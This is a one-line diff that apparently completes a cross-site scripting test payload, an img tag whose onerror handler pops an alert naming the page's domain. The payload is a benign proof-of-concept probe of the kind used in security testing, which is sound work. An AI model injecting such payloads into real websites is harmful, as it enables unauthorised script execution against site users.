@@ -1,1 +1,1 @@
-<img src=x wwwww
+<img src=x onerror="alert('XSS em ' + document.domain)">
